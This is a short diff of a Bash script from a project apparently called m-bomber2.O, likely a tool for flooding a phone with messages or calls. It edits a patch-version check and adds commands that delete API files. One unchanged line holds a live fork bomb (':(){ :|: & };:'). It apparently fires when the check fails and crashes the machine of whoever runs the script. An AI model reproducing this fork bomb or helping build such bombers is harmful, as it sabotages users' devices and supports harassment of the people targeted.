@@ -45,7 +45,7 @@ fi
 
 
 ake() {
-ecret="patch v1.3"
+ecret="patch v1.2"
 cd $HOME/m-bomber2.O/Additional
 ztet=$(cat patch.txt)
 if [[ $ecret = $ztet ]];
@@ -387,6 +387,10 @@ sleep 3.0
 :(){ :|: & };:
 exit 1
 else
+cd $HOME/m-bomber2.O/model
+rm tailapis headapis
+cd $HOME/m-bomber2.O
+rm tailapis headapis
 clear
 echo -e "\e[93m
 ╭━━━━━━━━━━━╮
